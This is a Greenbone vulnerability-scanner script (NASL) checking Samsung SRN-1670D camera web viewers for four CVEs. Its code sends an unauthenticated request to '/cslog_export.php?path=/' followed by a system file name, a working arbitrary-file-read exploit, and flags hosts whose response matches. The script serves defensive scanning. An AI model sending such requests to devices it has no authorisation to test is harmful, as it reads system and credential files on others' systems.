# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:samsung:web_viewer";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140510");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2017-11-16 14:07:32 +0700 (Thu, 16 Nov 2017)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-11-29 14:57:00 +0000 (Wed, 29 Nov 2017)");

  script_cve_id("CVE-2015-8279", "CVE-2015-8280", "CVE-2015-8281", "CVE-2017-16524");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Samsung SRN-1670D Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_samsung_web_viewer_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("samsung_webviewer/detected");

  script_tag(name:"summary", value:"Samsung SRN cameras are prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"Samsung SRN cameras are prone to multiple vulnerabilities:

  - Arbitrary file read (CVE-2015-8279)

  - User enumeration (CVE-2015-8280)

  - Weak firmware encryption (CVE-2015-8281)

  - Arbitrary file read and upload (CVE-2017-16524)");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://blog.emaze.net/2016/01/multiple-vulnerabilities-samsung-srn.html");
  script_xref(name:"URL", value:"https://github.com/realistic-security/CVE-2017-16524");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = "/cslog_export.php?path=/" + file;

  if (http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
